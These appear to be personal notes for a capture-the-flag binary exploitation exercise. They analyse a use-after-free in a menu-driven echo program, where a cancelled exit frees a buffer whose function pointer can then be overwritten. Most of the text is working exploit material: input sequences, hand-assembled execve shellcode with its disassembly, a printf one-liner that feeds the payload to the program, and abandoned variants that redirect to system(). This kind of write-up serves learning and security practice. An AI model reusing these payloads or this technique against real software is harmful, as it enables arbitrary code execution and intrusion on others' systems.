set context-clear-screen on
set context-sections "regs disasm stack"
context backtrace --off
cwatch execute "x/4x $ebp-32"
set show-compact-regs on
regs, disasm, code, ghidra, stack, backtrace, expressions, threads, heap_tracker, last_signal

fgets does NOT terminate on null

buf at      0x6032a0 -> buf[16] at      0x6032b0    x/8x 0x6032b0
e3buf at    0x6042e0 -> e3buf[16] at    0x6042f0    x/6i 0x6042f0
id at       0x6020a0

the program allocates a 40 byte 'buf':
    the first 24 bytes are (supposed to be) the user's name
        when the user first enters their name, the first 4 bytes are stored in 'id' 
    the next 8 are a pointer to the function greetings(), which is called at the start of echo2() and echo3()
    the last 8 are a pointer to the function byebye(), which is called at the end of echo2() and echo3()
EXP1: exiting the program through the (4) menu frees 'buf', EVEN if the user cancels the exit request
echo3 mallocs 32 bytes of memory for the user to input something, echoes it back, then frees it
    freeing it modifies the first 16 bytes, but leaves the last 16 intact -- so we can control the contents of e3buf[16:]
    if the 'buf' is freed through EXP1, then echo3's malloc will return a pointer to 'buf' -- so we can control the contents of buf[16:]
        importantly, this includes buf[24:], which nominally contains a pointer to greetings()

so:
    1. start program with name 'sh'
    2. call echo3 and install shellcode at e3buf[16]
    3. do EXP1 to free 'buf'
    4. call echo3 and install &e3buf at buf[24]
    5. call echo2() or echo3()

sh\n
3\nAAAABBBBCCCCDDDD\xb8\x3b\x00\x00\x00\xbf\xa0\x20\x60\x00\x48\x31\xf6\x0f\x05\n
4\nn\n
3\nAAAABBBBCCCCDDDDEEEEFFFF\xf0\x42\x60\x00\x00\x00\x00\x00\n
3\n

sh\n3\nAAAABBBBCCCCDDDD\xb8\x3b\x00\x00\x00\xbf\xa0\x20\x60\x00\x48\x31\xf6\x0f\x05\n4\nn\n3\nAAAABBBBCCCCDDDDEEEEFFFF\xf0\x42\x60\x00\x00\x00\x00\x00\n3\n

shellcode (15 bytes):  \xb8\x3b\x00\x00\x00\xbf\xa0\x20\x60\x00\x48\x31\xf6\x0f\x05
    b8 3b 00 00 00  mov    eax,0x3b     ; execve()
    bf a0 20 60 00  mov    edi,0x6020a0 ; arg0 (filename) -- stored in 'id'
    48 31 f6        xor    rsi,rsi      ; arg1 (argv)
                    xor    rdx,rdx      ; arg2 (envp)
    0f 05           syscall             ; 




------------------ no: free() overwrites the first 16 bytes
go through prompts to set up exploit| NAME\n4\nn\n3\n
(13) store /usr/bin/sh at buf[0]    | /usr/bin/sh\x00\x00
(17) store shellcode at buf[13]     | \xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05
(2)  pad to reach buf[32]           | \x00\x00
store &buf[13] at buf[32]           | \xa0\x32\x60\x00\x00\x00\x00\x00

run <<< $(printf "NAME\n4\nn\n3\n/usr/bin/sh\x00\x00\xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05\x00\x00\xa0\x32\x60\x00\x00\x00\x00\x00")


shellcode: 17 bytes
    mov     rdi, 0x6032a0       ; arg0 (filename) -- stored in buf[0]
    mov     rsi, 0x6032b0       ; arg1 (argv)
    mov     rdx, 0x6032b0       ; arg2 (envp)
    syscall
    
\xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05

0x6032a0:       0x7273752f      0x6e69622f      0x0068732f      0x32a0bf00
0x6032b0:       0xb0be0060      0xba006032      0x006032b0      0x0000050f


-----------too complicated
store &(buf[8]) at buf[0]
store "usr/bin/sh" at buf[8]
store &clib->system() at buf[32]
1. enter name
2. do exit->n. this frees the buf, allowing malloc to assign to it
3. do UAF echo (3): input 24 bytes, then 8 byte pointer to clib 'system'
4. do UAF echo (3): input  -> echo(3) will call system(